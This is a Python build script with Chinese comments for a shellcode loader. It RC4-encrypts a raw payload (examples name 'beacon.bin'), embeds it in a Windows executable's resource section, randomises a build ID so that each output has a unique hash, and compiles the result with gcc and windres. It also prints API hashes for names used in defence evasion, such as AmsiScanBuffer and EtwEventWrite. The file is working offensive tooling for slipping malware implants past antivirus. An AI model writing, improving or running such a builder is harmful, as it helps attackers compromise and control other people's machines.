#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shellcode Loader Builder - 资源段嵌入版 (单文件输出)
====================================================
输出: 单个 <name>.exe
加密 Shellcode 存于 PE 的 .rsrc (资源段, RT_RCDATA 101)
RC4 密钥内嵌于 C 模板的 .data 段 (仅16字节)

用法:
    python builder.py -s beacon.bin -o 2.exe
    python builder.py --hashes
"""

import argparse
import subprocess
import os
import sys
import random


# ── RC4 ────────────────────────────────────────

def rc4_ksa(key: bytes) -> list:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    S = rc4_ksa(key)
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)


# ── Helpers ────────────────────────────────────

def djb2(s: str) -> int:
    h = 5381
    for c in s:
        h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF
    return h

def bytes_to_c_array(raw: bytes) -> str:
    return ", ".join(f"0x{b:02x}" for b in raw)

def read_file(path: str) -> bytes:
    if not os.path.exists(path):
        print(f"[-] 找不到: {path}")
        sys.exit(1)
    with open(path, "rb") as f:
        return f.read()

def compute_api_hashes(apis):
    print("\n[+] API DJB2 哈希值:")
    for a in apis:
        print(f"    {a:<35s} => 0x{djb2(a):08x}UL")
    print()


# ── 构建 ───────────────────────────────────────

def build(shellcode_file: str, template_file: str, output_file: str, arch: str = "64"):
    print(f"[*] 读取 Shellcode: {shellcode_file}")
    raw = read_file(shellcode_file)
    print(f"    大小: {len(raw)} bytes")

    # 生成随机 RC4 密钥
    key = bytes([random.randint(1, 255) for _ in range(16)])
    print(f"[*] RC4 密钥: {key.hex()}")

    # 加密 Shellcode
    enc = rc4_encrypt(raw, key)
    print(f"[*] 加密完成: {len(enc)} bytes")

    # 生成随机 BUILD_ID (保证每次产物哈希唯一)
    build_id = bytes([random.randint(0, 255) for _ in range(16)])

    # 读取 C 模板，注入 RC4 密钥和 BUILD_ID
    print(f"[*] 读取 C 模板: {template_file}")
    tmpl = read_file(template_file).decode("utf-8")

    if "/* __KEY_PLACEHOLDER__ */" not in tmpl:
        print("[-] 找不到 '__KEY_PLACEHOLDER__' 占位符!")
        sys.exit(1)
    if "/* __BUILD_ID__ */" not in tmpl:
        print("[-] 找不到 '__BUILD_ID__' 占位符!")
        sys.exit(1)

    filled = tmpl.replace("/* __KEY_PLACEHOLDER__ */", bytes_to_c_array(key))
    filled = filled.replace("/* __BUILD_ID__ */",      bytes_to_c_array(build_id))

    # 临时文件名（避免与用户文件冲突）
    tmp_c    = "_bld_loader.c"
    tmp_bin  = "_bld_payload.bin"
    tmp_rc   = "_bld_resource.rc"
    tmp_res  = "_bld_resource.o"

    try:
        # 写加密 Payload 到临时 bin
        with open(tmp_bin, "wb") as f:
            f.write(enc)

        # 写 C 源文件
        with open(tmp_c, "w", encoding="utf-8") as f:
            f.write(filled)

        # 写 windres 资源定义文件
        # 101 RCDATA: 将加密 payload 嵌入 .rsrc 段 (ID=101, 类型=RT_RCDATA)
        rc_content = f'101 RCDATA "{tmp_bin}"\n'
        with open(tmp_rc, "w") as f:
            f.write(rc_content)

        # 步骤 1: windres 编译资源文件
        print(f"[*] windres: 将 payload 编译进 .rsrc 段...")
        windres_cmd = ["windres", "-i", tmp_rc, "-o", tmp_res,
                       f"--target=pe-x86-64" if arch == "64" else "--target=pe-i386"]
        r = subprocess.run(windres_cmd, capture_output=True, text=True)
        if r.returncode != 0:
            print(f"[-] windres 失败:\n{r.stderr}")
            sys.exit(1)

        # 步骤 2: GCC 链接资源对象 + C 代码
        m_flag = f"-m{arch}"
        gcc_cmd = ["gcc", tmp_c, tmp_res, "-o", output_file,
                   m_flag, "-s", "-O2", "-w",
                   "-lkernel32", "-lntdll"]
        print(f"[*] GCC: {' '.join(gcc_cmd)}")
        r = subprocess.run(gcc_cmd, capture_output=True, text=True, check=True)
        size = os.path.getsize(output_file)
        print(f"[+] 编译成功! => {output_file}  ({size} bytes)")
        print(f"    (payload 已嵌入 .rsrc 资源段，单文件，无需外置 .dat)")

    except subprocess.CalledProcessError as e:
        print("[-] GCC 编译失败:")
        print(e.stderr)
        sys.exit(1)
    finally:
        for f in [tmp_c, tmp_bin, tmp_rc, tmp_res]:
            if os.path.exists(f):
                os.remove(f)
        print("[*] 清理临时文件完毕。")


# ── 入口 ───────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Shellcode Loader Builder - .rsrc 资源段嵌入，单文件输出",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python builder.py -s beacon.bin
  python builder.py -s beacon.bin -o 2.exe
  python builder.py -s beacon.bin --32
  python builder.py --hashes
        """
    )
    parser.add_argument("-s", "--shellcode", help="RAW Shellcode 文件路径 (.bin)")
    parser.add_argument("-t", "--template",  default="loader_template.c")
    parser.add_argument("-o", "--output",    default="loader.exe")
    parser.add_argument("--32",  action="store_true", dest="arch32")
    parser.add_argument("--hashes", action="store_true", help="打印 API 哈希")
    args = parser.parse_args()

    if args.hashes:
        compute_api_hashes([
            "VirtualAlloc","VirtualFree","VirtualProtect","LoadLibraryA",
            "ConvertThreadToFiber","CreateFiber","SwitchToFiber","DeleteFiber",
            "EtwEventWrite","AmsiScanBuffer","GlobalMemoryStatusEx","GetSystemInfo",
            "GetSystemMetrics","GetTickCount64","GetForegroundWindow","Sleep",
        ])
        sys.exit(0)

    if not args.shellcode:
        parser.error("请指定 -s 参数。使用 --help 查看帮助。")

    build(args.shellcode, args.template, args.output, "32" if args.arch32 else "64")
